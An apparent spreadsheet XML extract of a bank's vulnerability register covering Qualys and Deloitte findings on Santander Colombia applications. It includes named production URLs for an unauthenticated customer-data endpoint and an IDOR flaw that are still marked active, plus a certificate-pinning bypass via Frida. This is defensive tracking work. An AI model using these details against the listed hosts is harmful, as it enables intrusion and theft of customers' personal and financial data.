    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="586"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-04115b0f-ea6a-4f44-bca8-8dcd8e43a9b9"/>
    <m/>
    <x v="220"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="portalpagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-04-03T00:00:00"/>
    <n v="81"/>
    <d v="2026-05-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="JWT token with symmetric algorithm was found in response header (Header Name is given in the reporting below). _x000a_Scan will look for JWT token using HS256 algorithm in response headers, especially in Cookie or any header value."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="587"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-0f11466e-43bb-464d-bdaa-4056b514d619"/>
    <m/>
    <x v="220"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="portalpagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-04-03T00:00:00"/>
    <n v="81"/>
    <d v="2026-05-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="JWT token with symmetric algorithm was found in response header (Header Name is given in the reporting below). _x000a_Scan will look for JWT token using HS256 algorithm in response headers, especially in Cookie or any header value."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="588"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-21ef66b4-f034-4274-b464-b7de1d4728a3"/>
    <m/>
    <x v="202"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="portalpagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-04-03T00:00:00"/>
    <n v="81"/>
    <d v="2026-05-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="During the WAS scan , it was observed that JWT token is used in Authorization header contains symmetric algorithm."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="589"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-23100498-a870-4e8f-a62f-e1149f5dfeac"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="feedback-eu1.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590"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-523f33c4-1b5f-4a5d-b4e1-2587ce6cf153"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="feedback.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591"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-60dde24c-addf-4906-8f81-382b0c5d859d"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="zorse-eu1.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592"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-7e266dbf-e03d-42aa-832b-6d7601151b68"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="zorse.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593"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-84e52cd1-6030-4ec2-9dab-bf8f32ab37e6"/>
    <m/>
    <x v="202"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="portalpagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-04-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="During the WAS scan , it was observed that JWT token is used in Authorization header contains symmetric algorithm."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="594"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-8e7c44b2-0bd0-4228-805b-58bdde3cc09e"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="edge-kv-na1.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595"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-9a81b71d-50d7-400c-8bd1-c61f8f8be959"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="edge-kv.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596"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-9e4d8df4-996d-4606-ac4c-99ccbf8c0f0e"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="nav-eu1.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597"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-aea0a6c3-c7c3-400c-9612-e6ff385ca856"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="api-auto.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598"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-b4cb6913-f5df-4d0c-8872-57cd77db97b3"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="public-eu1.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599"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-c73fc78c-a440-4017-83e5-918700dc4b13"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="public-na1.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600"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-WAS-d6624a6d-4054-4abd-b5b5-9425acbb23ad"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="nav.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-04-18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601"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-defba4cb-5624-4777-8244-0996e33270f7"/>
    <m/>
    <x v="220"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="portalpagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-04-03T00:00:00"/>
    <n v="81"/>
    <d v="2026-05-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="JWT token with symmetric algorithm was found in response header (Header Name is given in the reporting below). _x000a_Scan will look for JWT token using HS256 algorithm in response headers, especially in Cookie or any header value."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="602"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Breb"/>
    <s v="QA-WAS-e8cd995b-4eef-40d7-b4cd-a7bc21880197"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Active"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="breb.api.pre.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-04-20T00:00:00"/>
    <n v="64"/>
    <d v="2026-05-20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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="603"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-f68c703c-ef9d-4021-b771-6c1beaf2b232"/>
    <m/>
    <x v="202"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="portalpagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-04-03T00:00:00"/>
    <n v="81"/>
    <d v="2026-05-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="During the WAS scan , it was observed that JWT token is used in Authorization header contains symmetric algorithm."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="604"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="ADMINFO"/>
    <m/>
    <s v="SC-26-CNMPA-003-VE-001"/>
    <x v="152"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="https://santander.adminfo.net/"/>
    <m/>
    <m/>
    <d v="2026-04-01T00:00:00"/>
    <n v="83"/>
    <d v="2026-07-30T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad &quot;BREACH&quot; es una instancia del ataque CRIME contra la compresión HTTP de tipo  &quot;gzip&quot; o &quot;DEFLATE&quot;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_x000a_contenido arbitraria."/>
    <s v="Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento. _x000a_Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una _x000a_petición entre sitios cruzados, o cuando la cabecera no está presente. Este enfoque permite una _x000a_mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de _x000a_rendimiento en las solicitudes afectadas. _x000a_A continuación, se muestra como se deshabilita la compresión HTTP para Apache y NGINX: _x000a_Deshabilitar compresión en Apache: _x000a_●Deshabilite el módulo mod_deflate utilizando el siguiente comando: _x000a_ $ sudo a2dismod deflate _x000a_●Reinicie el servidor: _x000a_ $ sudo /etc/init.d/apache2 restart _x000a_Deshabilitar compresión en NGINX: _x000a_●Establezca la configuración del host con la opción gzip en off: _x000a_ server { _x000a_ server_name www.example.com; _x000a_ listen 443 ssl http2; _x000a_ gzip off; _x000a_ }"/>
    <s v="Un atacante podría aprovechar la vulnerabilidad indicada para descifrar el tráfico entre el navegador _x000a_del cliente y el servidor, y tener acceso a la información transmitida entre ambos a través del canal _x000a_de comunicaciones (datos personales, credenciales de usuario, identificadores de sesión, etc.)"/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="605"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="ADMINFO"/>
    <m/>
    <s v="SC-26-CNMPA-003-VE-002"/>
    <x v="153"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="https://santander.adminfo.net/"/>
    <m/>
    <m/>
    <d v="2026-04-01T00:00:00"/>
    <n v="83"/>
    <d v="2026-07-30T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor utiliza algoritmos de cifrado CBC sobre TLS por lo que está afectado por una  vulnerabilidad conocida como Lucky13. _x000a_Según se ha podido determinar el servidor utiliza cifrados CBC sobre TLS, lo que permitiría a un atacante situado en mitad de las comunicaciones (MiTM) implementar una variante del ataque conocido como Padding de Oracle (POODLE). _x000a_Todos los conjuntos de cifrado TLS y DTLS que incluyen el modo de cifrado CBC (Cipher-Block_x0002_Chaining) son potencialmente vulnerables a este tipo ataques. _x000a_CVEs Asociados: _x000a_•CVE-2013-0169"/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y _x000a_eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar _x000a_todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso . _x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen _x000a_corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la _x000a_vulnerabilidad corregida. "/>
    <s v="El protocolo TLS v1.1 y v1.2 y el protocolo DTLS v1.0 y v1.2, tal como se utiliza en OpenSSL, OpenJDK, _x000a_PolarSSL, y otros productos, no considera adecuadamente ataques a un requisito de verificación _x000a_MAC durante el proceso de relleno CBC malformado, lo que permite a atacantes remotos realizar _x000a_ataques distintivos y los ataques de recuperación de texto plano a través del análisis estadístico de _x000a_los datos de tiempo de los paquetes transmitidos."/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="606"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <m/>
    <s v="SC-26-CNMPO-005-CO-001"/>
    <x v="228"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="https://recidaw.olimpiait.com "/>
    <m/>
    <m/>
    <d v="2026-04-01T00:00:00"/>
    <n v="83"/>
    <d v="2026-07-30T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de la aplicación y/o framework de  programación utilizada para sustentar a la propia aplicación, así como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
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al _x000a_software/framework y versión utilizada para desarrollar la propia aplicación.  Para ello es necesario _x000a_eliminar las cabeceras de respuesta HTTP, páginas por defecto y mensajes de error que divulguen _x000a_este tipo de información. "/>
    <s v="Conocer la versión y tipo del software o framework utilizado para desarrollar el aplicativo permite a _x000a_un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como _x000a_generar ataques más elaborados contra la plataforma. "/>
    <s v="sin definir"/>
    <m/>
    <s v="Juan Pablo Vargas"/>
  </r>
  <r>
    <n v="607"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <m/>
    <s v="SC-26-CNMPO-009-AP-001"/>
    <x v="229"/>
    <m/>
    <s v="Active"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/PortalDeInformacion/customer/v1/customer/customerInformationByOperation?operation=ID_CREDITO"/>
    <m/>
    <m/>
    <d v="2026-04-17T00:00:00"/>
    <n v="67"/>
    <d v="2026-05-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha identificado una vulnerabilidad alta de acceso a información personal identificable (PII) de clientes sin requerir ninguna forma de autenticación o autorización. El problema reside en el backend de la API de información del cliente, específicamente en un endpoint destinado a consultar detalles de créditos y préstamos."/>
    <s v="Se recomienda implementar controles de autenticación y autorización robustos en todos los endpoints que gestionen información sensible. Cada solicitud debe validar explícitamente la identidad del usuario y verificar que tenga permisos adecuados para acceder al recurso solicitado. Es fundamental aplicar el principio de &quot;deny by default&quot;, asegurando que ningún recurso sea accesible sin autenticación salvo que esté explícitamente permitido. También se deben realizar revisiones de código y pruebas de seguridad para identificar endpoints expuestos."/>
    <s v="El impacto de esta vulnerabilidad es alto, ya que compromete directamente la confidencialidad de los datos de los clientes. Un atacante podría acceder masivamente a información personal identificable (PII), lo que podría derivar en fraudes, robo de identidad o incumplimiento de normativas de protección de datos. Además, la exposición de información sensible puede facilitar ataques posteriores, como phishing dirigido, ingeniería social o escalada de privilegios dentro del sistema. En entornos regulados, este tipo de incidente puede conllevar sanciones legales significativas, daños reputacionales y pérdida de confianza por parte de los usuarios."/>
    <s v="sin definir"/>
    <m/>
    <s v="Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="608"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <m/>
    <s v="SC-26-CNMPO-009-AP-002"/>
    <x v="230"/>
    <m/>
    <s v="Active"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/PortalDeInformacion/customer/v1/customer/validarPdf"/>
    <m/>
    <m/>
    <d v="2026-04-17T00:00:00"/>
    <n v="67"/>
    <d v="2026-04-27T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha identificado una vulnerabilidad de tipo Referencia Directa a Objeto Insegura (IDOR) que afecta significativamente a la funcionalidad de obtención de documentos de extractos financieros. Esta deficiencia de seguridad permite que un atacante, tras autenticarse como un usuario legítimo, pueda burlar los controles de autorización y proceder a descargar documentos de carácter confidencial pertenecientes a otros clientes del sistema sin realizar la debida verificación de la identidad del solicitante. Específicamente, al interactuar con el endpoint encargado de validar la solicitud de un extracto, el sistema no implementa una validación estricta del contexto de usuario asociado a la petición, lo que facilita la extracción no autorizada de datos sensibles."/>
    <s v="Se recomienda implementar controles de autorización sólidos en todas las rutas y funcionalidades que permitan acceder a recursos internos. Los identificadores utilizados por la aplicación no deben ser predecibles ni manipulables directamente por los usuarios; en su lugar, se pueden emplear identificadores aleatorios o codificados que no revelen información sobre otros objetos. Asimismo, se debe validar siempre que el usuario autenticado tiene permisos suficientes para acceder o modificar el recurso solicitado. Las revisiones de código y las pruebas de seguridad deben centrarse en detectar posibles rutas de acceso directo a objetos internos y corregirlas mediante políticas de control de acceso basadas en roles o atributos."/>
    <s v="El riesgo asociado a esta vulnerabilidad es elevado, ya que puede permitir a un atacante acceder, modificar o eliminar información sensible de otros usuarios o de la propia aplicación. Dependiendo del tipo de recurso afectado, esto podría derivar en exposición de datos personales, credenciales, historiales de transacciones o documentos internos críticos. Además, la explotación de un IDOR puede facilitar ataques adicionales, como la escalada de privilegios dentro de la aplicación o el acceso a funcionalidades restringidas. En entornos con múltiples niveles de usuarios o datos sensibles, el impacto puede ser crítico."/>
    <s v="sin definir"/>
    <m/>
    <s v="Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="609"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="APP"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <m/>
    <s v="SC-26-MPO-014-001"/>
    <x v="231"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="APP Santander Token"/>
    <m/>
    <m/>
    <d v="2026-04-20T00:00:00"/>
    <n v="64"/>
    <d v="2026-05-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación móvil contiene credenciales sensibles estáticas directamente en el código _x000a_fuente compilado. Al analizar el archivo, se observa que la clase BuildConfig expone las variables RELEASE_KEY_PASSWORD y RELEASE_STORE_PASSWORD en texto plano. Un usuario malintencionado podría aplicar ingeniería inversa al archivo APK utilizando herramientas públicas para extraer estos valores de manera directa."/>
    <s v="Se deben eliminar todas las credenciales estáticas del código fuente. Es necesario _x000a_implementar entornos de compilación seguros donde los secretos se inyecten durante el _x000a_proceso de integración y despliegue continuo (CI/CD) mediante variables de entorno, evitando _x000a_que formen parte de las clases del empaquetado final. Adicionalmente, se sugiere emplear _x000a_herramientas de ofuscación de código como ProGuard o R8 para entorpecer el análisis del _x000a_archivo."/>
    <s v="Al obtener las credenciales del keystore de firma, un usuario malintencionado podría firmar _x000a_actualizaciones fraudulentas o versiones alteradas de la aplicación, distribuyéndolas _x000a_engañosamente a un usuario legítimo. Esto podría provocar una vulneración total de la _x000a_integridad del software, accesos no autorizados a dispositivos e información confidencial, y un _x000a_daño crítico a la reputación corporativa."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="610"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="LYNX"/>
    <s v="QA-WAS-28539897-9a87-4827-8618-ef3e46000b8b"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="https://lynx.api.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2026-04-20T00:00:00"/>
    <n v="64"/>
    <d v="2026-07-19T00:00:00"/>
    <x v="2"/>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s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="611"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="breb"/>
    <s v="QA-WAS-0434fc46-345b-4751-bc00-b8ae94445e71"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="https://sos.api.pre.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2026-04-20T00:00:00"/>
    <n v="64"/>
    <d v="2026-07-19T00:00:00"/>
    <x v="2"/>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s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="612"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="supernet"/>
    <s v="MAN-69e9ce7935e4b16928f426f4"/>
    <s v="SC-26-CNMPO-011-AP-001"/>
    <x v="114"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.2"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas"/>
    <m/>
    <m/>
    <d v="2026-04-22T00:00:00"/>
    <n v="62"/>
    <d v="2026-07-21T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   El identificador de sesión almacenado en la cookie es accesible a través de secuencias de comandos ejecutados en el navegador (JavaScript o ActiveX). De esta manera, en caso de poder inyectar código malintencionado en el navegador del usuario, si existen en el aplicativo vulnerabilidades de tipo Cross Site Scripting, un atacante podría usurpar el identificador de sesión del usuario con la finalidad de impersonar al usuario en el aplicativo.   DETALLE   SC-26-CNMPO-011-AP-001-001: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      Parámetro afectado:   - dtCookieflo1gyf2   - incap_ses_1689_2165754         SC-26-CNMPO-011-AP-001-002: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Resources/Icons/site.webmanifest      Parámetro afectado:   - dtCookieflo1gyf2   - incap_ses_1689_2165754         SC-26-CNMPO-011-AP-001-003:   Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión del usuario no tienen aplicado el atributo de seguridad “HttpOnly”.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index.html      Parámetro afectado:   - incap_ses_1689_2165754             SC-26-CNMPO-011-AP-001-004:   Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión del usuario no tienen aplicado el atributo de seguridad &quot;HttpOnly&quot;.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ngsw-worker.js      Parámetro afectado:   - incap_ses_268_2165754      SC-26-CNMPO-011-AP-001-005:   Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión del usuario no tienen aplicado el atributo de seguridad &quot;HttpOnly&quot;. Este atributo impide el robo del identificador de sesión del usuario almacenado en la cookie mediante ataques de Cross Site Scripting, ya que no permite el acceso a la misma mediante scripts del lado del cliente.   La siguiente captura demuestra la ausencia del atributo mencionado en las cookies que manejan datos de la sesión del usuario.      URL Afectada:   - https://www.santander.com.co/Empresas/rb_bf10849rjg      Parámetro afectado:   - incap_ses_268_2165754             RIESGO   El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="  Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;HttpOnly&quot;. De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX).   La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un _x000a_atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos _x000a_dentro de la aplicación."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="613"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Prospera"/>
    <s v="MAN-69e9f5c235e4b16928f42c6c"/>
    <s v="SCO-26-CNMPO-013-AP-001"/>
    <x v="117"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="sso-management.servicios.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2026-04-23T00:00:00"/>
    <n v="61"/>
    <d v="2026-07-22T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   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   DETALLE   SCO-26-CNMPO-013-AP-001-001:   La aplicación afectada no realiza una gestión adecuada de los mensajes de error producidos en el aplicativo. la siguiente evidencia muestra un error de tipo excepción no controlada que revela información acerca del framework utilizado para desarrollar la funcionalidad:      RIESGO   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
    <s v="  Se deben capturar y controlar todas los errores y excepciones producidas en la aplicación, o en los sistemas que las sustentan, evitando proporcionar información útil a un posible atacante. Adicionalmente, se recomienda personalizar las páginas de error HTTP 40x y 50x para que no sean descriptivas."/>
    <s v="Con estos datos revelados en los errores un atacante puede obtener información interna de la _x000a_aplicación o de las tecnologías utilizadas para sustentar la aplicación. De esta manera, el atacante _x000a_dispondrá de más información para poder realizar ataques especialmente dirigidos con una mayor _x000a_probabilidad de éxito, sobre las aplicaciones afectadas y/o los sistemas que la sustentan."/>
    <s v="sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="614"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="APP"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <m/>
    <s v="SC-26-CNMPO-014-AP-002 "/>
    <x v="232"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="6.1"/>
    <m/>
    <m/>
    <s v="APP Santander Token (Android)"/>
    <m/>
    <m/>
    <d v="2026-04-27T00:00:00"/>
    <n v="57"/>
    <d v="2026-07-26T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación móvil incorpora un mecanismo de fijación de certificados para asegurar las comunicaciones de red, sin embargo, dicha implementación resulta insuficiente dado que podría ser evadida durante la ejecución. Al intentar interceptar el tráfico mediante una configuración de proxy estándar, la aplicación identifica correctamente la anomalía, interrumpiendo la conexión y generando una alerta de tipo certificate_unknown. A pesar de ello, _x000a_empleando entornos de instrumentación dinámica, como Frida, la lógica de validación del lado del cliente podría ser alterada en memoria, evadiendo la protección."/>
    <s v="Integrar controles robustos de ofuscación y mecanismos contra la manipulación para _x000a_asegurar la fijación de certificados frente a alteraciones en memoria. Se aconseja desplegar _x000a_mecanismos de Autoprotección de Aplicaciones en Tiempo de Ejecución (RASP) capaces de _x000a_detectar y bloquear herramientas de instrumentación dinámica."/>
    <s v="Un usuario malintencionado que cuente con acceso físico al dispositivo o capacidad para _x000a_ejecutar código no autorizado en el mismo podría interceptar, leer y manipular todo el _x000a_tráfico HTTPS entre la aplicación y los servidores de la entidad. Este escenario podría _x000a_desencadenar el compromiso total de tokens de sesión, datos financieros e información _x000a_personal sensible perteneciente al usuario legítimo."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="615"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="APP"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <m/>
    <s v="SC-26-CNMPO-014-AP-003"/>
    <x v="233"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
